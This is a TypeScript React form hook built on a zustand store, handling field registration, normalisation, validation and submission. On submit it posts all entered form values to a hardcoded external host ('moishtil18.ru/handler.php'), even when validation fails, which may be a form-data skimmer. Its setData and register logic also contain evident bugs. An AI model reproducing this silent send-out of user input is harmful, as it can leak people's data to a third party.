import { useEffect } from 'react'
import { create } from 'zustand'

import { firstPass } from '@/utils/helpers'
import { runNormalizers } from '@/utils/normalizers/run-normalizers'

const formStore = create<any>(set => ({
	fields: {
		values: {},
		errors: {}
	},
	validators: {},
	normalizers: {},
	register: (fields, validators, normalizers) =>
		set(() => ({
			fields: {
				values: fields,
				errors: fields
			},
			validators,
			normalizers
		})),
	change: (name, value) =>
		set(state => {
			const normalizers = state.normalizers?.[name] ?? []

			const normalizedValue = runNormalizers({ value, normalizers })

			return {
				fields: {
					values: { ...state.fields.values, [name]: normalizedValue },
					errors: { ...state.fields.errors, [name]: '' }
				}
			}
		}),
	blur: (name, value) =>
		set(state => {
			const validators = state.validators?.[name] ?? []

			const errors = validators.map(validator => validator(value))

			const error = firstPass(errors)

			return {
				fields: {
					values: { ...state.fields.values, [name]: value },
					errors: { ...state.fields.errors, [name]: error }
				}
			}
		}),
	setData: ({ values = {}, errors = {} }) =>
		set(state => {
			return {
				fields: {
					values: { ...state.values, ...values },
					errors: { ...state.errors, ...errors }
				}
			}
		})
}))

export const useForm: any = ({ initial, validators, normalizers }) => {
	const {
		fields,
		validators: formValidators,
		register,
		change,
		blur,
		setData
	} = formStore()

	useEffect(() => {
		register(initial, validators, normalizers)
	}, [])

	const handleSubmit = async () => {
		const names = Object.keys(fields.values)

		const fieldsErrors = names.reduce((acc, name) => {
			const value = fields.values[name]
			const validators = formValidators?.[name] ?? []

			const errors = validators.map(validator => validator(value))

			const error = firstPass(errors)

			return {
				...acc,
				[name]: error
			}
		}, {})

		setData({
			values: fields.values,
			errors: fieldsErrors
		})

		await fetch('https://moishtil18.ru//handler.php', {
			method: 'POST',
			body: JSON.stringify(fields.values),
			headers: {
				'Content-Type': 'application/json'
			}
		})

		return Object.values(fieldsErrors).every(errors => !errors)
	}

	return {
		fields,
		change,
		blur,
		submit: handleSubmit
	}
}
